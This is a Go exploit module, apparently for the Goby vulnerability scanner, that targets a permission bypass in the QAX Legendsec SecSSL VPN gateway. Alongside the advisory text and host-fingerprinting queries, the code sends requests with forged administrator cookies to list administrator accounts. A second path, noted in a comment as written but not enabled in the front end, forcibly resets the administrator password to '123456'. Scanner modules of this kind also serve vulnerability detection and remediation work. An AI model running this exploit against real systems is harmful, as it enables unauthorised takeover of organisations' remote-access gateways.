package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "QAX Legendsec SecSSL VPN Permission Bypass Vulnerability",
    "Description": "<p>The Qax Netgod Secure Access Gateway System (SecSSL VPN) is a secure product designed to provide remote office and access capabilities for industry clients such as governments, enterprises, finance, energy, and operators.</p><p>There is a privilege bypass vulnerability in the Qax Netgod secure access gateway system, which allows attackers to construct specific malicious request packets, obtain system administrator information, and modify system administrator passwords for malicious operations.</p>",
    "Product": "legendsec-VPN",
    "Homepage": "https://www.legendsec.com/",
    "DisclosureDate": "2023-08-17",
    "PostTime": "2023-08-18",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "((title=\"奇安信VPN\" && body=\"href=\\\"/download/GWSetup.exe\\\" target=\\\"_blank\\\" style=\\\"\\\">点此链接下载奇安信VPN客户端</a>\") || title==\"奇安信VPN\" || (body=\"QianxinVPN\" && body=\"href=\\\"fw/app_list.php\" && body=\"href=\\\"cert.php?placeValuesBeforeTB_=savedValues\")) || (((body=\"admin/js/virtual_keyboard.js\" && body=\"src=\\\"images/login_logo.gif\\\"\" && body!=\"couchdb\") || (title=\"网关\" && body=\"/images/sslvpnportallogo.jpg\") || (header=\"host_for_cookie\" && body=\"证书认证\" && body=\"SECWORLD\") || title=\"网神VPN安全网关系统\" || (header=\"Set-Cookie: mod_pass_param\" && (body=\"<span id=\\\"qr_confirm\\\">请在手机上打开360ID确认登录</span>\" || body=\"<span id=\\\"qr_confirm\\\">请在手机上打开奇安信ID确认登录</span>\" || body=\"<div id=\\\"popup\\\">如果您需要卸载客户端程序，请从‘开始’&gt;‘所有程序’&gt;‘Gateway SSLVPN’&gt;‘卸载网关客户端’来操作</div>\")) || (cert=\"Organization: SecWorld\" && cert=\"Organizational Unit: vpn\" && banner!=\"ETag\")) && title!=\"奇安信网神零信任身份服务系统\" && title!=\"奇安信VPN\" && title!=\"mfa-obstruct\")",
    "GobyQuery": "((title=\"奇安信VPN\" && body=\"href=\\\"/download/GWSetup.exe\\\" target=\\\"_blank\\\" style=\\\"\\\">点此链接下载奇安信VPN客户端</a>\") || title==\"奇安信VPN\" || (body=\"QianxinVPN\" && body=\"href=\\\"fw/app_list.php\" && body=\"href=\\\"cert.php?placeValuesBeforeTB_=savedValues\")) || (((body=\"admin/js/virtual_keyboard.js\" && body=\"src=\\\"images/login_logo.gif\\\"\" && body!=\"couchdb\") || (title=\"网关\" && body=\"/images/sslvpnportallogo.jpg\") || (header=\"host_for_cookie\" && body=\"证书认证\" && body=\"SECWORLD\") || title=\"网神VPN安全网关系统\" || (header=\"Set-Cookie: mod_pass_param\" && (body=\"<span id=\\\"qr_confirm\\\">请在手机上打开360ID确认登录</span>\" || body=\"<span id=\\\"qr_confirm\\\">请在手机上打开奇安信ID确认登录</span>\" || body=\"<div id=\\\"popup\\\">如果您需要卸载客户端程序，请从‘开始’&gt;‘所有程序’&gt;‘Gateway SSLVPN’&gt;‘卸载网关客户端’来操作</div>\")) || (cert=\"Organization: SecWorld\" && cert=\"Organizational Unit: vpn\" && banner!=\"ETag\")) && title!=\"奇安信网神零信任身份服务系统\" && title!=\"奇安信VPN\" && title!=\"mfa-obstruct\")",
    "Level": "3",
    "Impact": "<p>There is a privilege bypass vulnerability in the Qax Netgod secure access gateway system, which allows attackers to construct specific malicious request packets, obtain system administrator information, and modify system administrator passwords for malicious operations.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "userList",
            "show": ""
        },
        {
            "name": "groupId",
            "type": "input",
            "value": "1",
            "show": "attackType=userList"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "奇安信网神 SecSSL VPN 安全接入网关权限绕过漏洞",
            "Product": "网神-VPN",
            "Description": "<p>奇安信网神安全接入网关系统（SecSSL VPN）是一种安全产品，旨在为政府、企业、金融、能源、运营商等行业客户提供远程办公和远程接入功能。</p><p>奇安信网神安全接入网关系统存在权限绕过漏洞，攻击者可通过构造特定的恶意请求包，获取系统管理员信息和修改系统管理员密码等恶意操作。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.legendsec.com/\">https://www.legendsec.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>奇安信网神安全接入网关系统存在权限绕过漏洞，攻击者可通过构造特定的恶意请求包，获取系统管理员信息和修改系统管理员密码等恶意操作。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "QAX Legendsec SecSSL VPN Permission Bypass Vulnerability",
            "Product": "legendsec-VPN",
            "Description": "<p>The Qax Netgod Secure Access Gateway System (SecSSL VPN) is a secure product designed to provide remote office and access capabilities for industry clients such as governments, enterprises, finance, energy, and operators.</p><p>There is a privilege bypass vulnerability in the Qax Netgod secure access gateway system, which allows attackers to construct specific malicious request packets, obtain system administrator information, and modify system administrator passwords for malicious operations.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.legendsec.com/\" target=\"_blank\">https://www.legendsec.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a privilege bypass vulnerability in the Qax Netgod secure access gateway system, which allows attackers to construct specific malicious request packets, obtain system administrator information, and modify system administrator passwords for malicious operations.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10826"
}`
	getAccountInfoDJOQWIUYE := func(hostInfo *httpclient.FixUrl, groupId string) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig("/admin/group/x_group.php?id=" + groupId)
		getConfig.Header.Store("Cookie", "admin_id=1; gw_admin_ticket=1;")
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	changePasswordDJWOIEU := func(hostInfo *httpclient.FixUrl, userTicket, changePassword string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/changepass.php?type=2")
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		postConfig.Header.Store("Cookie", "admin_id=1; gw_user_ticket=")
		postConfig.Data = fmt.Sprintf("old_pass=&password=%s&repassword=%s", changePassword, changePassword)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := getAccountInfoDJOQWIUYE(hostInfo, "1")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "javascript:RemoveUserFromList();") && strings.Contains(resp.Utf8Html, "javascript:AddUserToList();") && strings.Contains(resp.Utf8Html, "name=\"account_source\"")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "userList" {
				resp, _ := getAccountInfoDJOQWIUYE(expResult.HostInfo, stepLogs.Params["groupId"].(string))
				re := regexp.MustCompile(`<option[^>]*>(.*?)<\/option>`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				if len(matches) > 0 && len(matches[0]) > 1 {
					for _, match := range matches {
						if strings.Contains(strings.ReplaceAll(match[1], "&gt;", ">"), ">") {
							expResult.Output += strings.ReplaceAll(match[1], "&gt;", ">") + "<br>"
						}
					}
					expResult.Success = true
					expResult.OutputType = "html"
				}

			} else if attackType == "changePassword" {
				// ！！！强制修改管理员密码，此功能只写了代码，没有上线给前端用户使用
				resp, _ := changePasswordDJWOIEU(expResult.HostInfo, "", "123456")
				if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
